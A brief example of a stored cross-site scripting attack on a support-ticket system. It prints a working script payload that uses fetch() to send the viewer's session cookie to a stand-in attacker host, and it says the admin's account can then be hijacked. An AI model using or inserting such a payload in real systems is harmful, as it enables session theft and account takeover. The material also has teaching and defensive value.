# XSS Real-World Example

Example 1: Stored XSS in Support Ticket
Payload: <script>fetch('http://attacker.com/?c='+document.cookie)</script>
Result: When the admin opens the ticket, their browser sends their session cookie to your server.
Impact: Admin account hijacking
